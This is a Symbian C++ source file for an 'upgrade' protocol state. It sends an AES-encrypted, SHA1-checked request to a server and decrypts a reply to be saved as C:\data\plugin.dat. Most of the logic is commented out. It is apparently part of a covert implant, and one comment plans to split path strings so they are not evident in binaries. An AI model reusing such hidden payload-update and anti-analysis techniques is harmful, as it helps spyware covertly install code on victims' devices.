/*
 * StateUpgrade.cpp
 *
 *  Created on: 27/feb/2011
 *      Author: Giovanna
 */

#include "StateUpgrade.h"
#include "Keys.h"
#include "AdditionalDataStructs.h"
#include <HT\LogFile.h>
#include <HT\ShaUtils.h>
#include <HT\AES.h>
#include <HT\RESTUtils.h>
#include <HT\FileUtils.h>



CStateUpgrade::CStateUpgrade(MStateObserver& aObserver) : CAbstractState(EState_Upgrade, aObserver)
	{
	// No implementation required
	}

CStateUpgrade::~CStateUpgrade()
	{
	delete iRequestData;
	delete iResponseData;
	}

CStateUpgrade* CStateUpgrade::NewLC(MStateObserver& aObserver)
	{
	CStateUpgrade* self = new (ELeave) CStateUpgrade(aObserver);
	CleanupStack::PushL(self);
	self->ConstructL();
	return self;
	}

CStateUpgrade* CStateUpgrade::NewL(MStateObserver& aObserver)
	{
	CStateUpgrade* self = CStateUpgrade::NewLC(aObserver);
	CleanupStack::Pop(); // self;
	return self;
	}

void CStateUpgrade::ConstructL()
	{
	}

void CStateUpgrade::ActivateL(const TDesC8& aData)
	{
	// Parameter aData stores the K key
	iSignKey.Copy(aData);
	
	//TODO: uncomment request, at this moment the request is not sent, so upgrades are ignored
	//TODO: remember to comment comment ProcessDataL() at the end of this method!
	/*
	TBuf8<32> plainBody(KProto_Upgrade);
	_LIT8(KZero,"\x00\x00\x00\x00");
	plainBody.Append(KZero);
	// calculate SHA1
	TBuf8<20> sha;
	ShaUtils::CreateSha(plainBody,sha);
	//append SHA1
	plainBody.Append(sha);
	//encrypt
	RBuf8 buff(AES::EncryptPkcs5L(plainBody, KIV, iSignKey));
	buff.CleanupClosePushL();
	//add REST header
	HBufC8* header = iObserver.GetRequestHeaderL();
	TBuf8<32> contentLengthLine;
	contentLengthLine.Append(KContentLength);
	contentLengthLine.AppendNum(buff.Size());
	contentLengthLine.Append(KNewLine);
	iRequestData = HBufC8::NewL(header->Size()+contentLengthLine.Size()+KNewLine().Size()+buff.Size());
	iRequestData->Des().Append(*header);
	delete header;
	iRequestData->Des().Append(contentLengthLine);
	iRequestData->Des().Append(KNewLine);
	iRequestData->Des().Append(buff);
	CleanupStack::PopAndDestroy(&buff);
		
	iObserver.SendStateDataL(*iRequestData);
	 */
	
	//TODO: when ready with upgrade, comment the following line 
	ProcessDataL(KNullDesC8);
	}

void CStateUpgrade::ProcessDataL(const TDesC8& aData) 
	{
	// TODO: uncomment this part when ready with upgrade
	/*
	//free resources
	delete iRequestData;
	iRequestData = NULL;
		
	if(aData.Size()!=0)
		{
		if(iResponseData == NULL)
			{
			iResponseData = aData.AllocL();
			}
		else
			{
			TInt size = iResponseData->Size();
			iResponseData = iResponseData->ReAllocL(size+aData.Size()); //TODO:check the result of allocation
			iResponseData->Des().Append(aData);
			}
			return;
		}
			
	if(iResponseData->Find(KApplicationOS)==KErrNotFound)
		{
		//server answered with a redirect
		iObserver.ResponseError(KErrContent);
		return;
		}
			
	//extract body from response
	RBuf8 body(CRestUtils::GetBodyL(*iResponseData));
	body.CleanupClosePushL();
		
	RBuf8 plainBody(AES::DecryptPkcs5L(body,KIV,iSignKey));
	CleanupStack::PopAndDestroy(&body);
	plainBody.CleanupClosePushL();
	//check sha1
	if(!ShaUtils::ValidateSha(plainBody.Left(plainBody.Size()-20),plainBody.Right(20)))
		{
		CleanupStack::PopAndDestroy(&plainBody);
		iObserver.ResponseError(KErrSha);
		return;
		}
	//check response
	if(plainBody.Left(4).Compare(KProto_Ok) == 0)
		{
		//TODO: create a method that saves upgrade as C:\data\plugin.dat
		//TODO: combine strings c:\data\ and plugin.dat, so that the entire string
		// is not evident into binaries
		//SaveUpgradeL(plainBody.Right(plainBody.Size()-8),...); //8=KProto_Ok|len
		//TODO: if everything ok, uncomment the following line when ready with upgrade
		//iObserver.UpgradeAvailable();
		}
	CleanupStack::PopAndDestroy(&plainBody);
	*/
	iObserver.ChangeStateL(KErrNone);
	}

